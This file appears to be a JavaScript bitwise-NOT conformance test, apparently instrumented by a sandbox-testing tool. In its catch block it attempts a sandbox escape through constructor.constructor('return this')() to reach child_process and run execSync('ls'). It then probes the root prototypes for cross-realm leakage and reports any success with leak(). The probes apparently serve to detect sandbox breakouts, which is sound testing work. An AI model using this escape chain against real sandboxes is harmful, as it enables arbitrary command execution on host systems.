try {
    if (~2147483647 !== -2147483648) {
        $ERROR('#1: ~2147483647 ==== -2147483648)');
    }
    if (~2147483648 !== ~-2147483648) {
        $ERROR('#2: ~2147483648 ==== ~-2147483648)');
    }
    if (~2147483649 !== ~-2147483647) {
        $ERROR('#3: ~2147483649 ==== ~-2147483647)');
    }
    if (~4294967295 !== ~-1) {
        $ERROR('#4: ~4294967295 ==== ~-1)');
    }
    if (~4294967296 !== ~0) {
        $ERROR('#5: ~4294967296 ==== ~0)');
    }
    if (~4294967297 !== ~1) {
        $ERROR('#6: ~4294967297 ==== ~1)');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}